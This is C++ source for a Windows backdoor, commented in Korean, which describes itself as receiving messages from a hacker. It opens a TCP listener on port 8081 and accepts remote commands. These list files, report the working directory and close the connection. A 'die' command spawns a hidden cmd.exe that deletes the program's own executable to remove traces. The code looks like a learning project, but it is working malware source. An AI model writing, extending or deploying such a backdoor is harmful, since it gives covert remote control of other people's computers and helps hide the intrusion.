#define _CRT_NONSTDC_NO_DEPRECATE
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h> 
#include <stdio.h> 
#include<string.h>
#include<stdlib.h>
#include<Windows.h>
#include<string>
#include <vector>
#include<iostream>
#include<fstream>
#include <Ws2tcpip.h> // inet_ntop, inet_pton
#pragma comment(lib,"Ws2_32.lib")
#include <strsafe.h> 
#define SELF_REMOVE_STRING TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"%s\"") 
void self_Kill() // 백도어 자가삭제 함수
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH]; 
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	GetModuleFileName(NULL, szModuleName, MAX_PATH); 
	// 현재 프로세스의 프로세스 얻어옴
	StringCbPrintfA(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	// 백그라운드 모드로 cmd 생성, ping 명령을 통해 현재 파일 삭제
	CloseHandle(pi.hThread); 
	CloseHandle(pi.hProcess);
}
//typedef std::wstring str_t;
using namespace std;
typedef struct sendCmd 
{
	char cmd[100];
	char argv[512];

}SendCmd; // 해커로 부터 메세지를 받을 구조체

int main() {
	char myaddr[] = "127.0.0.1";
	char str[INET_ADDRSTRLEN];
	WSADATA wsaData;
	SOCKADDR_IN servAddr, clientAddr;
	SOCKET tcp_sock, hclientSock;

	SendCmd *p;
	char message[512];
	int szClntAddr; //주소 길이
	int str_len; // 메세지 길이

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("WSA error\n");
		return -1;
	} 
	// 어떤 버전의 소켓을 사용할지 소켓라이브러리 지정
	// 소켓 버전은 가장 최신의 2.2 버전
	// wsaData에 소켓의 세부정보가 저장될 것임

	tcp_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (tcp_sock == INVALID_SOCKET) {
		printf("소켓생성실패\n");
		return -1;
	}
	// ipv4 protocol, TCP타입, TCP 기반의 소켓 생성

	memset(&servAddr, 0, sizeof(servAddr));
	// 서버 네트워크 정보를 담을 구조체 초기화

	servAddr.sin_family = AF_INET; // ipv4 protocol
	servAddr.sin_port = htons(8081); // 포트 선정
	inet_pton(AF_INET, myaddr, &(servAddr.sin_addr.s_addr));
	/*  myaddr의 ipv4형식의 ip를 s_addr의 네트워크 구조체 형식으로
		변환해서 넣어줌 */

	if (bind(tcp_sock, (SOCKADDR *)&servAddr, sizeof(servAddr))) {
		printf("Bind ERROR\n");
	} 
	// bind 함수로 소켓에 ip와 포트를 지정해줌. 통신준비

	if (listen(tcp_sock, 5) == SOCKET_ERROR) {
		printf("Listen ERROR\n");
	} 
	// listen으로 클라이언트 접속요청을 기다리도록 설정
	// 앞으로 쭉 기다릴 것임

	printf("Successful complete\n");
	printf("listen ok port %u\n", 8081);

	inet_ntop(AF_INET, &(servAddr.sin_addr), str, INET_ADDRSTRLEN);
	// str 배열에 sin_addr의 네트워크 주소를 변환해서 넣어줌.
	// 네트워크 주소 구조체 형식 -> 캐릭터 형 문자열로 변환
	// 사람이 읽을 수 있는 ipv4 주소가 되는 과정임.
	printf("%s\n", str);
	// 사람이 읽을 수 있나 없나 봅시다.

	szClntAddr = sizeof(clientAddr);

	while (1) {
		hclientSock = accept(tcp_sock, (SOCKADDR*)&clientAddr, &szClntAddr);
		// accept로 클라이언트와 통신하는 전용소켓 생성

		if (hclientSock == INVALID_SOCKET) {
			printf("Accept ERROR\n");
			exit(1);
		}
		else
			printf("Accept Client\n");
		
		while ((str_len = recv(hclientSock, message, 512, 0)) != 0) {
			p = (SendCmd*)message;
			if (strncmp("exit", p->cmd,4) == 0) {
				if (closesocket(hclientSock) == SOCKET_ERROR) {
					printf("close Socket ERROR\n");
				}
				else {
					printf("close Socket clearly");
				}
				closesocket(tcp_sock);
				WSACleanup();
				Sleep(5000);
				return 0;
			}
			else if (strncmp("die", p->cmd, 3) == 0) {
				self_Kill(); // self kill
				return 0;
			}
			else if (strncmp("ls", p->cmd,2) == 0) {
				WIN32_FIND_DATA data;
				vector<string> names;
				HANDLE hFind=FindFirstFile(p->argv, &data);
				if (hFind != INVALID_HANDLE_VALUE) {
					do {
						names.push_back(data.cFileName);
					} while (FindNextFile(hFind, &data) != 0);
					FindClose(hFind);
				}
				char fsize[4];
				itoa(names.size(), fsize, 10);
				send(hclientSock, fsize, sizeof(fsize), 0);
				for (int i = 0; i < atoi(fsize); i++) {
					send(hclientSock, &(names.back()[0]), names.back().size(), 0);
					Sleep(150);
					names.pop_back();
				}
			}
			else if (strncmp("pwd", p->cmd, 3) == 0) {
				char tmp[256];
				system("cd > tempo");
				ifstream fin("tempo");
				fin >> tmp;
				fin.close();
				DeleteFile("tempo");
				send(hclientSock, tmp, strlen(tmp), 0); // 클라이언트에서 받은걸 다시 send
			}
			
		}
	}
	closesocket(tcp_sock);
	WSACleanup();
	return 0;

}